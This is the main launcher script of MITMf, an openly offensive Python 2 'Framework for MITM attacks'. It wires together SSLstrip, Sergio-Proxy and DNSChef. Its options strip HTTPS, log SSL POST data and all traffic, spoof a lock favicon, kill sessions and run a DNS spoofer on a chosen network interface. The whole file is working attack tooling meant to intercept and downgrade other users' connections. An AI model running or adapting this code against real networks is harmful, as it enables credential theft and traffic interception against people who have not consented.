#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import sys
import argparse
import os
import logging

from twisted.web import http
from twisted.internet import reactor
from core.sslstrip.CookieCleaner import CookieCleaner
from core.sergioproxy.ProxyPlugins import ProxyPlugins
from core.utils import Banners
from core.utils import PrintException
from configobj import ConfigObj

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import get_if_addr, get_if_hwaddr

from plugins import *
plugin_classes = plugin.Plugin.__subclasses__()

try:
    import user_agents
except ImportError:
    print "[-] user_agents library missing! User-Agent parsing will be disabled!"

mitmf_version = "0.9.6"
sslstrip_version = "0.9"
sergio_version = "0.2.1"
dnschef_version = "0.4"

Banners().printBanner()

if os.geteuid() != 0:
    sys.exit("[-] When man-in-the-middle you want, run as r00t you will, hmm?")

parser = argparse.ArgumentParser(description="MITMf v{} - Framework for MITM attacks".format(mitmf_version), version=mitmf_version, usage='', epilog="Use wisely, young Padawan.",fromfile_prefix_chars='@')
#add MITMf options
mgroup = parser.add_argument_group("MITMf", "Options for MITMf")
mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
mgroup.add_argument("-i", "--interface", required=True, type=str,  metavar="interface" ,help="Interface to listen on")
mgroup.add_argument("-c", "--config-file", dest='configfile', type=str, default="./config/mitmf.conf", metavar='configfile', help="Specify config file to use")
mgroup.add_argument('-d', '--disable-proxy', dest='disproxy', action='store_true', default=False, help='Only run plugins, disable all proxies')
#added by alexander.georgiev@daloo.de
mgroup.add_argument('-m', '--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')

#add sslstrip options
sgroup = parser.add_argument_group("SSLstrip", "Options for SSLstrip library")
#sgroup.add_argument("-w", "--write", type=argparse.FileType('w'), metavar="filename", default=sys.stdout, help="Specify file to log to (stdout by default).")
slogopts = sgroup.add_mutually_exclusive_group()
slogopts.add_argument("-p", "--post", action="store_true",help="Log only SSL POSTs. (default)")
slogopts.add_argument("-s", "--ssl", action="store_true", help="Log all SSL traffic to and from server.")
slogopts.add_argument("-a", "--all", action="store_true", help="Log all SSL and HTTP traffic to and from server.")
#slogopts.add_argument("-c", "--clients", action='store_true', default=False, help='Log each clients data in a seperate file') #not fully tested yet
sgroup.add_argument("-l", "--listen", type=int, metavar="port", default=10000, help="Port to listen on (default 10000)")
sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")

#Initialize plugins
plugins = []
try:
    for p in plugin_classes:
        plugins.append(p())
except:
    print "Failed to load plugin class {}".format(p)

#Give subgroup to each plugin with options
try:
    for p in plugins:
        if p.desc == "":
            sgroup = parser.add_argument_group(p.name,"Options for {}.".format(p.name))
        else:
            sgroup = parser.add_argument_group(p.name, p.desc)

        sgroup.add_argument("--{}".format(p.optname), action="store_true",help="Load plugin {}".format(p.name))

        if p.has_opts:
            p.add_options(sgroup)
except NotImplementedError:
    sys.exit("[-] {} plugin claimed option support, but didn't have it.".format(p.name))

args = parser.parse_args()

try:
    configfile = ConfigObj(args.configfile)
except Exception, e:
    sys.exit("[-] Error parsing config file: {}".format(e))

config_args = configfile['MITMf']['args']
if config_args:
    print "[*] Loading arguments from config file"
    for arg in config_args.split(' '):
        sys.argv.append(arg)
    args = parser.parse_args()

####################################################################################################

# Here we check for some variables that are very commonly used, and pass them down to the plugins
try:
    args.ip_address = get_if_addr(args.interface)
    if (args.ip_address == "0.0.0.0") or (args.ip_address is None):
        sys.exit("[-] Interface {} does not have an assigned IP address".format(args.interface))
except Exception, e:
    sys.exit("[-] Error retrieving interface IP address: {}".format(e))

try:
    args.mac_address = get_if_hwaddr(args.interface)
except Exception, e:
    sys.exit("[-] Error retrieving interface MAC address: {}".format(e))

args.configfile = configfile #so we can pass the configobj down to all the plugins

####################################################################################################

log_level = logging.__dict__[args.log_level.upper()]

#Start logging 
logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logFormatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
mitmf_logger = logging.getLogger('mitmf')

fileHandler = logging.FileHandler("./logs/mitmf.log")
fileHandler.setFormatter(logFormatter)
mitmf_logger.addHandler(fileHandler)

#####################################################################################################

#All our options should be loaded now, pass them onto plugins
print "[*] MITMf v{} online... initializing plugins".format(mitmf_version)

load = []

for p in plugins:

    if vars(args)[p.optname] is True:
        print "|_ {} v{}".format(p.name, p.version)
        if hasattr(p, 'tree_output') and p.tree_output:
            for line in p.tree_output:
                print "|  |_ {}".format(line)
                p.tree_output.remove(line)

    if getattr(args, p.optname):
        p.initialize(args)
        load.append(p)

    if vars(args)[p.optname] is True:
        if hasattr(p, 'tree_output') and p.tree_output:
            for line in p.tree_output:
                print "|  |_ {}".format(line)

#Plugins are ready to go, start MITMf
if args.disproxy:
    ProxyPlugins.getInstance().setPlugins(load)
else:
    
    from core.sslstrip.StrippingProxy import StrippingProxy
    from core.sslstrip.URLMonitor import URLMonitor
    from libs.dnschef.dnschef import DNSChef

    URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
    URLMonitor.getInstance().setResolver(args.configfile['MITMf']['DNS']['resolver'])
    URLMonitor.getInstance().setResolverPort(args.configfile['MITMf']['DNS']['port'])
    
    DNSChef.getInstance().setCoreVars(args.configfile['MITMf']['DNS'])
    if args.configfile['MITMf']['DNS']['tcp'].lower() == 'on':
        DNSChef.getInstance().startTCP()
    else:
        DNSChef.getInstance().startUDP()

    CookieCleaner.getInstance().setEnabled(args.killsessions)
    ProxyPlugins.getInstance().setPlugins(load)

    strippingFactory              = http.HTTPFactory(timeout=10)
    strippingFactory.protocol     = StrippingProxy

    reactor.listenTCP(args.listen, strippingFactory)

    #load custom reactor options for plugins that have the 'plugin_reactor' attribute
    for p in plugins:
        if getattr(args, p.optname):
            if hasattr(p, 'plugin_reactor'):
                p.plugin_reactor(strippingFactory) #we pass the default strippingFactory, so the plugins can use it

    print "|"
    print "|_ Sergio-Proxy v{} online".format(sergio_version)
    print "|_ SSLstrip v{} by Moxie Marlinspike online".format(sslstrip_version)
    print "|_ DNSChef v{} online\n".format(dnschef_version)

reactor.run()

#run each plugins finish() on exit
for p in load:
    p.finish()